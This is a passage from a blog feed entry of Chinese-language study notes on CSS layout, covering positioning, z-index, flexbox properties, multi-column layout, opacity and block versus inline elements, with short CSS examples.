bottom</code>对于其最近的一个具有定位属性的父包含块进行绝对定位(没有则选择body元素，即浏览器窗口)<br>demo:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">position: absolute;</span><br><span class="line">    left:100px;</span><br><span class="line">    top:200px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>相对定位(position: relative)<br>同样设置好<code>position: relative</code>之后，使用<code>left|right|top|bottom</code>相对于原来位置移动</p></li><li><p>固定定位(position: fixed)<br>设置<code>position: fixed</code>，使用<code>left|right|top|bottom</code>，效果和绝对定位类似，他是相对于屏幕固定的，不会随着浏览器滚动条变动，也不会因为窗口的放大或缩小而动态变化。</p></li></ol><blockquote><p>可以给导航栏用</p></blockquote><ol start="4"><li>Relative和Absolute组合使用<br>相对其他元素进行定位。<br>参照定位元素:<code>position: relative</code><br>相对定位元素:<code>position: absolute</code>之后即可以使用left、top等熟悉进行偏移了。</li></ol><ol start="5"><li>重叠：<code>z-index</code><br>设置图层位置，也就是谁在上谁在下</li></ol><p>即以z轴作参考，数值大的在上层<br>demo:<br><code>z-index:-1</code></p><h2 id="弹性盒子布局"><a href="#弹性盒子布局" class="headerlink" title="弹性盒子布局"></a>弹性盒子布局</h2><p>继css布局工具只有float和position以来，flex实现了一些它们难以实现的功能。</p><ol><li>flex模型说明</li></ol><p><img src="http://static.zybuluo.com/Passer6y/uwicaulmzsjpmzmiwvrhajvc/image_1d1g3ld6ka2s19laqkjsbi22e19.png" alt="image_1d1g3ld6ka2s19laqkjsbi22e19.png-47.2kB"></p><ul><li>主轴（main axis）是沿着 flex 元素放置的方向延伸的轴（比如页面上的横向的行、纵向的列）。该轴的开始和结束被称为 main start 和 main end。</li><li>交叉轴（cross axis）是垂直于 flex 元素放置方向的轴。该轴的开始和结束被称为 cross start 和 cross end。</li><li>设置了 display: flex 的父元素（在本例中是 <section>）被称之为 flex 容器（flex container）。</section></li><li>在 flex 容器中表现为柔性的盒子的元素被称之为 flex 项（flex item）（本例中是 <article> 元素</article></li></ul><ol start="2"><li><p>设置弹性盒子<br><code>display: flex</code></p></li><li><p>设置展示方向<br><code>flex-direction: row | row-reverse | column | column-reverse</code></p></li></ol><p>默认为row，即排列成一行，加了reverse即元素顺序倒序。</p><ol start="4"><li><p>换行<br><code>flex-wrap: wrap | nowrap</code><br>默认值为:nowrap，即不换行<br>demo:<br>元素溢出时换行设置换行：<code>flex-wrap: wrap</code></p></li><li><p><code>flex-flow</code>缩写(上述两个参数)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flex-direction: row;</span><br><span class="line">flex-wrap: wrap;</span><br></pre></td></tr></table></figure></li></ol><p>-&gt;<br><code>flex-flow: row wrap</code></p><ol start="6"><li>动态尺寸<br><code>flex: &lt;number&gt;;</code></li></ol><p>demo:flex弹性盒子中三个article盒子宽(高)度比例为1:2:3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">article:nth-of-type(1)&#123;</span><br><span class="line">    flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(2)&#123;</span><br><span class="line">    flex: 2;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(3)&#123;</span><br><span class="line">    flex: 3; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>demo2：<br>还可以指定最小值，每个盒子分配完100px后，接着按比例将剩余空间分配<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">article:nth-of-type(1)&#123;</span><br><span class="line">  flex: 1 100px;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(2)&#123;</span><br><span class="line">  flex: 2 100px;</span><br><span class="line">&#125;</span><br><span class="line">article:nth-of-type(3)&#123;</span><br><span class="line">  flex: 3 100px;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="7"><li>垂直对齐</li></ol><p>控制flex在交叉轴(纵轴)的位置<br><code>align-items: stretch | center | start | end</code><br>stretch：默认值，在交叉轴方向拉伸，以填充父容器，如果父容器在交叉轴没有固定的高度，则和最长的flex项高度保持一致</p><blockquote><p>demo:<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/align-items</a></p></blockquote><p><code>align-self: flex-start | flex-end</code><br> 可以覆盖<code>align-items</code>的效果<br> demo:<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> button:first-child &#123;</span><br><span class="line">  align-self: flex-end;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="8"><li>水平对齐<br><code>justify-content: center | start | end | flex-start | flex-end | space-between | space-around | space-evenly等等</code></li></ol><ul><li>flex-start：从行首起始位置开始排列</li><li>start： 从主轴开始排列</li><li>space-between: 均匀排列元素，首个元素放置于起点，末尾元素放置于终点</li><li>space-around： 均匀排列每个元素，每个元素周围分配相同的空间</li><li>space-evenly;  均匀排列每个元素，每个元素之间的间隔相等 </li></ul><blockquote><p>全部参数：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/justify-content</a></p></blockquote><ol start="9"><li>flex项排序<br><code>order: &lt;number&gt;;</code>：数值越大的在越后面</li></ol><p>demo:将第一个按钮放最后，后边的以此往前移动<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">button:first-child&#123;</span><br><span class="line">        order: 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><ol start="10"><li>flex 嵌套<br>可以为flex项目的孩子设置<code>display:flex</code>使之表现为flexible box</li></ol><p>缩写语法规则：<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex</a></p><ol start="11"><li>flex 缩写<br><code>flex: 0 0 200px;</code></li></ol><ul><li>参数1：<code>flex-grow</code>，该值表示和其他flex盒子成的比例关系</li><li>参数2：<code>flex-shrink</code>, 默认宽度大于容器时的一个收缩规则，也是比例关系。</li><li>参数3：<code>flex-basis</code>, 有效宽度值，即基准值。</li></ul><h2 id="多列布局"><a href="#多列布局" class="headerlink" title="多列布局"></a>多列布局</h2><blockquote><p>文本的多列布局？</p><ol><li>多列布局： <code>Columns</code><br><code>columns：&lt;column-width&gt; || &lt;column-count&gt;</code>，属性值列宽和列数。<br>demo: 200px 两列<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">columns: 200px 2;</span><br></pre></td></tr></table></figure></li></ol></blockquote><ol start="2"><li><p>列宽： <code>column-width</code><br><code>column-width: auto | &lt;length&gt;</code>，可以单独使用。</p></li><li><p>列数：<code>column-count</code><br><code>column-count：auto | &lt;integer&gt;</code></p></li><li><p>列间距： <code>column-gap</code><br><code>column-gap: normal || &lt;length&gt;</code>，默认1em，也可以用px作单位</p></li><li><p>列边框样式：<code>column-rule</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">column-rule:&lt;column-rule-width&gt;|&lt;column-rule-style&gt;|&lt;column-rule-color&gt;</span><br></pre></td></tr></table></figure></li></ol><p>和border类似，设置列边框的宽/样式/颜色<br>demo：<br><code>column-rule: 2px dotted green;</code></p><ol start="6"><li>跨列设置: <code>column-span</code><br><code>column-span:all | none</code>， all为跨越所有列</li></ol><ol start="17"><li>CSS3 opacity属性<br>设置元素的不透明级别<br>demo: 设置div元素为透明<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">div&#123;</span><br><span class="line">    opacity: 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="0x03-元素"><a href="#0x03-元素" class="headerlink" title="0x03 元素"></a>0x03 元素</h2><p>元素分类：</p><ul><li><p>块状：默认为块级元素一个占一行(从新一行开始，后面的元素另起一行)。高、宽、行高、顶和底边距可设，默认占父容器100%。<br>使用<code>display:block</code>可将非块状元素转化成块状。常见元素有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;、&lt;p&gt;、&lt;h1&gt;...&lt;h6&gt;、&lt;ol&gt;、&lt;ul&gt;、&lt;dl&gt;、&lt;table&gt;、&lt;address&gt;、&lt;blockquote&gt; 、&lt;form&gt;</span><br></pre></td></tr></table></figure></li><li><p>内联：和其他元素在一行上，元素高、宽度及顶和底边距不可设置，元素宽度即其包含的内容的宽度，不可改变。可以使用<code>display: inline</code>将非内联元素转换为内联元素。常见元素：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&gt;、&lt;span&gt;、&lt;br&gt;、&lt;i&gt;、&lt;em&gt;、&lt;strong&gt;、&lt;label&gt;、&lt;q&gt;、&lt;var&gt;、&lt;cite&gt;、&lt;code&gt;</span><br></pre></td></tr></table></figure></li><li><p>内联块状： 同时具备内联元素和块状的特点，和其他元素在一行，元素边距可设置。可以使用<code>display: inline-block</code>转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img&gt;、&lt;input&gt;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;想个小组wiki写个炫酷的前端，这半个月来一直在不断的练习前端开发，分享一些自己学习过程的记录~&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Code" scheme="http://0day.design/categories/Code/"/>
    
    
      <category term="Code" scheme="http://0day.design/tags/Code/"/>
    
  </entry>
  
</feed>
